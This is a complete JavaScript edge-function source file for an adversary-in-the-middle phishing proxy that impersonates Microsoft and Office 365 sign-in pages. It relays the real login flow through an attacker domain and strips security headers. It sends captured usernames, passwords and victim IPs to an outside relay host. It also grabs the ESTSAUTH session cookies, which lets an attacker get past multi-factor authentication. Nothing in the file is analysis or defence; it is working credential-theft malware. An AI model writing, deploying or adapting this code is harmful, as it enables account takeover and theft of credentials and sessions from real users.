export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// List of domains to proxy (Microsoft and common identity providers)
const PROXY_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com',
  'account.live.com',
  'account.microsoft.com',
  'aadcdn.msauth.net',
  'www.office.com',
  'office.com',
  'microsoft365.com',
  'outlook.office.com',
  'outlook.live.com'
];

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, url) {
  try {
    const formData = new FormData();
    formData.append("file", new Blob([cookieText], { type: "text/plain" }), `${ip}-COOKIES.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function isProxyDomain(hostname) {
  return PROXY_DOMAINS.includes(hostname) || 
         hostname.includes('.microsoft.com') ||
         hostname.includes('.live.com') ||
         hostname.includes('.office.com');
}

function extractUpstreamFromPath(pathname) {
  // Remove leading slash
  const cleanPath = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  
  // Check for /_p/domain/ pattern
  if (cleanPath.startsWith('_p/')) {
    const parts = cleanPath.split('/');
    if (parts.length >= 2) {
      const domain = parts[1];
      const remainingPath = parts.length > 2 ? '/' + parts.slice(2).join('/') : '/';
      
      if (isProxyDomain(domain)) {
        return { domain, path: remainingPath };
      }
    }
  }
  
  // Default to Microsoft login
  return { domain: 'login.microsoftonline.com', path: pathname };
}

function rewriteUrl(url, currentDomain) {
  try {
    // If it's already our domain
    if (url.hostname === YOUR_DOMAIN) {
      // Ensure it has /_p/ prefix
      if (!url.pathname.startsWith('/_p/')) {
        return `https://${YOUR_DOMAIN}/_p/${currentDomain}${url.pathname}${url.search}`;
      }
      return url.toString();
    }
    
    // If it's a domain we should proxy
    if (isProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}/_p/${url.hostname}${url.pathname}${url.search}`;
    }
    
    // Don't proxy other domains
    return url.toString();
  } catch (e) {
    return url.toString();
  }
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    // Try form data (Microsoft login uses this)
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username') || params.get('Email');
    pass = params.get('passwd') || params.get('password') || params.get('Password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}
  
  return { user, pass };
}

// ==================== SIMPLE TRANSPARENT PROXY HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  // Block specific IPs
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Extract upstream domain from path
  const { domain: upstreamDomain, path: upstreamPath } = extractUpstreamFromPath(url.pathname);
  
  // Build the actual upstream URL
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}${url.search}`;
  
  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // === BUILD REQUEST HEADERS - SIMPLE AND CLEAN ===
  const headers = new Headers();
  
  // Copy all headers from original request except problematic ones
  for (const [key, value] of request.headers) {
    const lowerKey = key.toLowerCase();
    // Skip headers that might cause issues
    if (!['host', 'connection', 'keep-alive', 'content-length', 'content-encoding', 
           'transfer-encoding', 'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for',
           'cf-ray', 'cf-connecting-ip', 'cf-worker'].includes(lowerKey)) {
      headers.set(key, value);
    }
  }
  
  // Set correct Host header
  headers.set('Host', upstreamDomain);
  
  // Ensure Referer is set
  if (!headers.has('Referer')) {
    headers.set('Referer', `https://${upstreamDomain}/`);
  }
  
  // Ensure Origin is set for POST requests
  if (request.method === 'POST' && !headers.has('Origin')) {
    headers.set('Origin', `https://${upstreamDomain}`);
  }

  // === HANDLE REQUEST BODY AND CREDENTIALS ===
  let body = request.body;
  
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user.substring(0, 5)}...`);
        await sendToVercel('credentials', { 
          ip, user, pass, url: url.href 
        });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      body = bodyText;
    } catch (err) {
      body = request.body;
    }
  }

  try {
    // === MAKE REQUEST TO UPSTREAM ===
    const response = await fetch(upstreamUrl, {
      method: request.method,
      headers: headers,
      body: body,
      redirect: 'manual'
    });

    // === HANDLE REDIRECTS ===
    if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
      const location = response.headers.get('Location');
      const rewrittenLocation = rewriteUrl(new URL(location, upstreamUrl), upstreamDomain);
      console.log(`[REDIRECT] ${response.status} ${location} -> ${rewrittenLocation}`);
      
      const redirectHeaders = new Headers();
      redirectHeaders.set('Location', rewrittenLocation);
      redirectHeaders.set('Access-Control-Allow-Origin', '*');
      redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
      
      return new Response(null, {
        status: response.status,
        headers: redirectHeaders
      });
    }

    // === PROCESS RESPONSE COOKIES ===
    const responseHeaders = new Headers();
    
    // Copy all response headers except problematic ones
    for (const [key, value] of response.headers) {
      const lowerKey = key.toLowerCase();
      if (!['content-security-policy', 'content-security-policy-report-only', 
             'clear-site-data', 'content-encoding'].includes(lowerKey)) {
        
        // Handle Set-Cookie headers specially
        if (lowerKey === 'set-cookie') {
          // Replace domain in cookie
          let modifiedCookie = value;
          
          // Replace upstream domain with our domain
          modifiedCookie = modifiedCookie.replace(
            new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'),
            YOUR_DOMAIN
          );
          
          // Also handle cookies with leading dot
          modifiedCookie = modifiedCookie.replace(
            new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g'),
            '.' + YOUR_DOMAIN
          );
          
          responseHeaders.append('Set-Cookie', modifiedCookie);
        } else {
          responseHeaders.set(key, value);
        }
      }
    }
    
    // Add CORS headers
    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
    responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    responseHeaders.set('Access-Control-Allow-Headers', 'Content-Type, Cookie, Set-Cookie');

    // === CHECK FOR AUTH COOKIES AND EXFILTRATE ===
    const setCookies = response.headers.getSetCookie();
    if (setCookies && setCookies.length) {
      const allCookies = setCookies.join('; ');
      const hasESTSAUTH = allCookies.toLowerCase().includes('estsauth=');
      const hasESTSAUTHPERSISTENT = allCookies.toLowerCase().includes('estsauthpersistent=');
      
      if (hasESTSAUTH && hasESTSAUTHPERSISTENT) {
        console.log(`[EXFIL] Complete session captured!`);
        await exfiltrateCookies(allCookies, ip, url.href);
      }
    }

    // === PROCESS RESPONSE BODY ===
    const contentType = response.headers.get('content-type') || '';
    
    // For HTML/JS/CSS/JSON, replace domain references
    if (contentType.includes('text/html') || 
        contentType.includes('javascript') || 
        contentType.includes('json') || 
        contentType.includes('css')) {
      
      let text = await response.text();
      
      // Replace all proxy domains with our proxied URLs
      for (const domain of PROXY_DOMAINS) {
        const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(regex, `https://${YOUR_DOMAIN}/_p/${domain}`);
        
        // Also replace http:// versions
        const httpRegex = new RegExp(`http://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(httpRegex, `https://${YOUR_DOMAIN}/_p/${domain}`);
      }
      
      return new Response(text, {
        status: response.status,
        headers: responseHeaders
      });
    }
    
    // Return binary/other content as-is
    return new Response(response.body, {
      status: response.status,
      headers: responseHeaders
    });

  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { 
        status: 502, 
        headers: { 'Content-Type': 'application/json' }
      }
    );
  }
}

// Export for all HTTP methods
export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
